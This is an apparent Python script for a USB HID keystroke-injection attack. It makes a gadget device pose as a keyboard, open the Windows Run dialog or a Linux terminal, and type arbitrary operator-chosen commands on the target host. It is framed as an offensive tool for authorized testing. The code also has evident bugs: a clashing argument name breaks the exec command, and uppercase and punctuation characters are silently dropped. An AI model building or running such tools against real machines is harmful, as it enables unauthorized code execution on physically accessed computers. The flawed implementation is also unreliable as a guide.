#!/usr/bin/env python3
"""
USB HID Attack Tool
Real offensive capabilities for authorized security testing
"""

import argparse
import time
import random
import os
import sys
from fcntl import ioctl
import struct

# USB HID keyboard codes
KEY_CODES = {
    'a': 4, 'b': 5, 'c': 6, 'd': 7, 'e': 8, 'f': 9, 'g': 10, 'h': 11,
    'i': 12, 'j': 13, 'k': 14, 'l': 15, 'm': 16, 'n': 17, 'o': 18, 'p': 19,
    'q': 20, 'r': 21, 's': 22, 't': 23, 'u': 24, 'v': 25, 'w': 26, 'x': 27,
    'y': 28, 'z': 29, '1': 30, '2': 31, '3': 32, '4': 33, '5': 34, '6': 35,
    '7': 36, '8': 37, '9': 38, '0': 39, 'ENTER': 40, 'ESC': 41, 'BACKSPACE': 42,
    'TAB': 43, 'SPACE': 44, 'MINUS': 45, 'EQUAL': 46, 'LEFTBRACE': 47,
    'RIGHTBRACE': 48, 'BACKSLASH': 49, 'SEMICOLON': 51, 'APOSTROPHE': 52,
    'GRAVE': 53, 'COMMA': 54, 'DOT': 55, 'SLASH': 56, 'CAPSLOCK': 57,
    'F1': 58, 'F2': 59, 'F3': 60, 'F4': 61, 'F5': 62, 'F6': 63, 'F7': 64,
    'F8': 65, 'F9': 66, 'F10': 67, 'F11': 68, 'F12': 69, 'RIGHT': 79,
    'LEFT': 80, 'DOWN': 81, 'UP': 82, 'LEFTCTRL': 224, 'LEFTSHIFT': 225,
    'LEFTALT': 226, 'LEFTMETA': 227, 'RIGHTCTRL': 228, 'RIGHTSHIFT': 229,
    'RIGHTALT': 230, 'RIGHTMETA': 231
}

# Modifier keys
MODIFIERS = {
    'CTRL': 0x01,
    'SHIFT': 0x02,
    'ALT': 0x04,
    'META': 0x08
}

class USBHIDAttack:
    def __init__(self, device="/dev/hidg0"):
        self.device = device
        self.fd = None
        self.open_device()

    def open_device(self):
        try:
            self.fd = open(self.device, 'wb')
        except Exception as e:
            print(f"[!] Error opening device {self.device}: {e}")
            sys.exit(1)

    def send_report(self, modifier, key):
        report = bytes([modifier, 0, key, 0, 0, 0, 0, 0])
        self.fd.write(report)
        self.fd.flush()
        time.sleep(0.01)
        # Release keys
        self.fd.write(bytes([0, 0, 0, 0, 0, 0, 0, 0]))
        self.fd.flush()

    def press_key(self, key, modifier=0):
        if key in KEY_CODES:
            self.send_report(modifier, KEY_CODES[key])
        elif key.upper() in KEY_CODES:
            self.send_report(MODIFIERS['SHIFT'], KEY_CODES[key.upper()])

    def type_string(self, string, delay=0.05):
        for char in string:
            if char == '\n':
                self.press_key('ENTER')
            elif char == ' ':
                self.press_key('SPACE')
            elif char == '\t':
                self.press_key('TAB')
            else:
                self.press_key(char)
            time.sleep(delay)

    def execute_command(self, command, platform="windows"):
        if platform == "windows":
            # Open command prompt
            self.press_key('r', MODIFIERS['META'])
            time.sleep(0.5)
            self.type_string("cmd\n")
            time.sleep(1)
            
            # Execute command
            self.type_string(f"{command}\n")
        elif platform == "linux":
            # Open terminal (Ctrl+Alt+T)
            self.press_key('t', MODIFIERS['CTRL'] | MODIFIERS['ALT'])
            time.sleep(1)
            
            # Execute command
            self.type_string(f"{command}\n")

    def open_terminal(self, platform="windows"):
        if platform == "windows":
            self.execute_command("")
        elif platform == "linux":
            self.execute_command("")

    def close(self):
        if self.fd:
            self.fd.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="USB HID Attack Tool")
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    # Type command
    type_parser = subparsers.add_parser('type', help='Type a string')
    type_parser.add_argument('text', help='Text to type')
    type_parser.add_argument('--delay', type=float, default=0.05, help='Delay between keystrokes')
    
    # Execute command
    exec_parser = subparsers.add_parser('exec', help='Execute a command')
    exec_parser.add_argument('command', help='Command to execute')
    exec_parser.add_argument('--platform', choices=['windows', 'linux'], default='windows', help='Target platform')
    
    # Open terminal
    term_parser = subparsers.add_parser('terminal', help='Open terminal')
    term_parser.add_argument('--platform', choices=['windows', 'linux'], default='windows', help='Target platform')
    
    args = parser.parse_args()
    
    attack = USBHIDAttack()
    
    try:
        if args.command == 'type':
            print(f"[+] Typing: {args.text}")
            attack.type_string(args.text, args.delay)
        elif args.command == 'exec':
            print(f"[+] Executing: {args.command}")
            attack.execute_command(args.command, args.platform)
        elif args.command == 'terminal':
            print(f"[+] Opening terminal on {args.platform}")
            attack.open_terminal(args.platform)
    finally:
        attack.close()
